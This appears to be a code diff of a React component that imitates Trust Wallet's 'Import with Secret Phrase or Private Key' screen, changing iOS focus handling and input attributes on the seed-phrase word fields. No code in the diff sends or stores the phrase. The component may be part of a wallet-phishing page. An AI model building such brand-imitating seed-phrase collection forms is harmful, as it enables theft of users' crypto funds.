@@ -105,9 +105,9 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
 					<TrustWalletFull />
 				</span>
 				<div className="w-full max-w-2xl">
-					<h1 className="text-2xl font-bold mb-6">
+					<h2 className="text-2xl font-bold mb-6">
 						Import with Secret Phrase or Private Key
-					</h1>
+					</h2>
 
 					<div className="space-y-6">
 						{/* Wallet Name */}
@@ -146,16 +146,24 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
 							</label>
 
 							<div
+								onClick={handleAreaClick}
 								className={`relative flex flex-wrap rounded-lg p-4 min-h-56 cursor-text transition-colors ${
 									areaFocused
 										? "border-1 border-green-600"
 										: "border border-neutral-700"
 								} bg-neutral-900`}
-								onClick={handleAreaClick}
-								onFocus={() => setAreaFocused(true)}
-								onBlur={() => setAreaFocused(false)}
-								tabIndex={0}
 							>
+								{/* Hidden textarea for iOS focus */}
+								<textarea
+									className="absolute opacity-0 pointer-events-none h-0 w-0"
+									autoCapitalize="none"
+									autoComplete="off"
+									autoCorrect="off"
+									spellCheck="false"
+									onFocus={() => setAreaFocused(true)}
+									onBlur={() => setAreaFocused(false)}
+								/>
+
 								{words.map((word, index) => (
 									<div key={index}>
 										<input
@@ -164,12 +172,13 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
 											}}
 											type={visibility[index] ? "text" : "password"}
 											value={word}
-											onInput={(e) => handleInput(e, index)} // ✅ Mobile & desktop compatible
+											onInput={(e) => handleInput(e, index)}
+											onKeyDown={(e) => handleKeyDown(e, index)}
+											inputMode="text"
 											autoCapitalize="none"
-											autoComplete="off"
 											autoCorrect="off"
-											spellCheck="true"
-											onKeyDown={(e) => handleKeyDown(e, index)} // ✅ Handles desktop keys
+											spellCheck="false"
+											enterKeyHint="next"
 											style={{
 												width: `${Math.max(word.length, 1)}ch`,
 											}}
@@ -178,7 +187,6 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
 									</div>
 								))}
 
-								{/* Eye Icon */}
 								<button
 									type="button"
 									onClick={toggleAllVisibility}
